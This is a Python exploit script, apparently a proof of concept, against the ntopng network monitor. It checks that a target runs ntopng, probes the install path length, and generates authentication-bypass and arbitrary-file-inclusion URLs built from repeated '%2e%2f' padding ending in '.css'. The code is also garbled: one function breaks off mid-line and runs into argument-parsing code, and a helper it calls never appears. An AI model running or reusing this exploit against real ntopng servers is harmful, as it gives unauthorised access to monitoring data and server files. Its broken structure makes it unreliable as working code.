import sys
import requests
import argparse
import logging
def is_ntopng() -> bool:
    response = session.get(base_url, allow_redirects=False)
    return response.status_code == 302 and '/lua/login.lua' in response.headers.get('Location', '')
def get_base_length() -> int:
    for i in range(90, 120):
        url = base_url + '/lua/' + '%2e%2f' * i + 'as_stats.lua.css'
        response = session.get(url, allow_redirects=False)
        if response.status_code ', required=True)
    parser.add_argument('-v', '--verbose', default=False, action='store_true')
    subparsers = parser.add_subparsers(dest='action')
    baselength_command = subparsers.add_parser('baselength', help='get base path length of ntopng')
    generate_command = subparsers.add_parser('generate', help='generate the authenticate bypass url')
    generate_command.add_argument('-l', '--length', type=int, help='base path length of target ntopng', metavar='', required=True)
    generate_command.add_argument('-p', '--path', help='lua pathname', metavar='', required=True)
    generate_command = subparsers.add_parser('include', help='generate the arbitrary file inclusion url')
    generate_command.add_argument('-l', '--length', type=int, help='base path length of target ntopng', metavar='', required=True)
    generate_command.add_argument('-i', '--include', help='path to include', metavar='', required=True)
    args = parser.parse_args()
    if not args.action:
        parser.print_help()
        sys.exit(1)
    if args.verbose:
        logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
    base_url = args.url.rstrip('/')
    # check target
    if not is_ntopng():
        raise RuntimeError('No Ntopng detected')
    if args.action == 'baselength':
        base_length = get_base_length()
        sys.stdout.write(f'ntopng install path length: {base_length}\n')
    elif args.action == 'generate':
        base_length = args.length
        path = args.path
        sys.stdout.write(base_url + '/lua/' + '%2e%2f' * get_padding_length(path) + path + '.css\n')